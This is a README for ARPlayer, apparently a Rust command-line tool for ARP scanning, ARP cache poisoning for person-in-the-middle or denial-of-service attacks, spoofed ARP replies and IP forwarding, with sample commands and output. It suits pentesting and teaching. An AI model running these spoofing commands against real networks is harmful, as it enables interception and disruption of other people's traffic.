# ARPlayer

[![Crates.io](https://img.shields.io/crates/v/arplayer)](https://crates.io/crates/arplayer)
[![Language Rust](https://img.shields.io/badge/Language-Rust-blue)](https://www.rust-lang.org/)


You can use ARPlayer to perform several attacks/techniques that involve ARP.

For using ARPlayer you will need `root` privileges, since it is necessary to create raw sockets.

## Installation

To install:
```
$ cargo install arplayer
```

## Scan

You can perform a use ARP requests to scan the local network. You can use the `scan` command to perform an ARP scan on the network.

```bash
$ sudo arplayer scan -I eth2 -w 10
192.168.100.1 52:54:00:5b:49:5d
192.168.100.2 52:54:00:0b:75:57
192.168.100.7 52:54:00:a4:8c:f2
192.168.100.5 52:54:00:76:87:bb
...
```

## Spoof

You can poison the ARP cache table of network computers by sending continuous ARP responses that that indicates that the MAC of other computers is related with your IP (or some IP that you choose). That way you can perform an PitM or DoS attack, depending if you redirect the traffic or not.

You can perform an ARP spoofing/poisoning attack with the `spoof` command. You need to specify the victim(s) IP address and the gateway address. By default, it only will poison the cache of the victim , but you can use the `-b/--bidirectional` flag to also poison the gateway cache.

Moreover, to perform a PitM attack you will need to enable forwarding of the IP packets. You can do it with the `-F/--forward` flag.

The following example shows a PitM for 2 victims and the gateway:

```bash
$ arplayer spoof -I eth2 -b -F 192.168.100.7,192.168.100.5 192.168.100.2 -v
Spoofing - telling 192.168.100.7 (52:54:00:a4:8c:f2) that 192.168.100.2 is 52:54:00:88:80:0c (192.168.100.44) every 1.0 seconds (until Ctrl-C)
Spoofing - telling 192.168.100.5 (52:54:00:76:87:bb) that 192.168.100.2 is 52:54:00:88:80:0c (192.168.100.44) every 1.0 seconds (until Ctrl-C)
INFO - 192.168.100.2-52:54:00:88:80:0c -> 192.168.100.7-52:54:00:a4:8c:f2
INFO - 192.168.100.7-52:54:00:88:80:0c -> 192.168.100.2-52:54:00:0b:75:57
INFO - 192.168.100.2-52:54:00:88:80:0c -> 192.168.100.5-52:54:00:76:87:bb
INFO - 192.168.100.5-52:54:00:88:80:0c -> 192.168.100.2-52:54:00:0b:75:57
INFO - 192.168.100.2-52:54:00:88:80:0c -> 192.168.100.7-52:54:00:a4:8c:f2
INFO - 192.168.100.7-52:54:00:88:80:0c -> 192.168.100.2-52:54:00:0b:75:57
INFO - 192.168.100.2-52:54:00:88:80:0c -> 192.168.100.5-52:54:00:76:87:bb
INFO - 192.168.100.5-52:54:00:88:80:0c -> 192.168.100.2-52:54:00:0b:75:57
^CReadjusting 192.168.100.2 for 192.168.100.7 (52:54:00:a4:8c:f2)
Readjusting 192.168.100.2 for 192.168.100.5 (52:54:00:76:87:bb)
INFO - 192.168.100.2-52:54:00:0b:75:57 -> 192.168.100.7-52:54:00:a4:8c:f2
INFO - 192.168.100.7-52:54:00:a4:8c:f2 -> 192.168.100.2-52:54:00:0b:75:57
INFO - 192.168.100.2-52:54:00:0b:75:57 -> 192.168.100.5-52:54:00:76:87:bb
INFO - 192.168.100.5-52:54:00:76:87:bb -> 192.168.100.2-52:54:00:0b:75:57
...     
```

## Reply

With the `reply` command you can set a ARP "listener" that will replay to any ARP request with your MAC (or a custom one). You can also use parameters to filter the ARP requests you want to reply based on the source MAC and IP or the requested IP.

```bash
$ sudo arplayer reply -I eth0  --match-dst-ips 192.168.122.1 -v
INFO - Reply request for 192.168.122.1 from 192.168.122.83 (52:54:00:15:c9:6b)
INFO - Reply request for 192.168.122.1 from 192.168.122.138 (52:54:00:d9:d2:ca)
...
```

## Forward

You can use the `forward` command to view the IP forwarding state and enable/disable it.

```bash
$ sudo arplayer forward
0
$ sudo arplayer forward -e
$ sudo arplayer forward -e -v
INFO - net.ipv4.ip_forward = 1
$ sudo arplayer forward
1
```

# Disclaimer

Please, don't use this tool for bad things. I won't assume any responsibility for your actions with this tool.
